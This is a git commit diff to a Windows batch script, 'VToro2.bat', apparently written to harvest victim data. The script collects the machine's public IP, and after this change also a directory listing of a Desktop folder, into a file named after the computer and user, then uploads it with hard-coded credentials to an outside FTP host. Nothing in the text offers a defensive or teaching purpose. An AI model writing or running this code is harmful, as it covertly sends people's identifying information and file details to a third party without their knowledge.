7734ce1af615c501acb8068c8cbdc36409b9fb94
Papela <45976195+Papela@users.noreply.github.com>
2021-03-24 18:31:17 +0100

    Update VToro2.bat

--- VToro2.bat
+++ VToro2.bat
@@ -1,7 +1,8 @@
 @echo off
 Color 9
 cd "C:\Users\%username%\AppData\Local\Temp\"
-curl ifconfig.me > IP~%computername%~%username%.txt
+curl ifconfig.me >> IP~%computername%~%username%.txt
+dir "C:\Users\%username%\Desktop\Prueba" >> IP~%computername%~%username%.txt
 timeout /t 1
 curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
 timeout /t 1
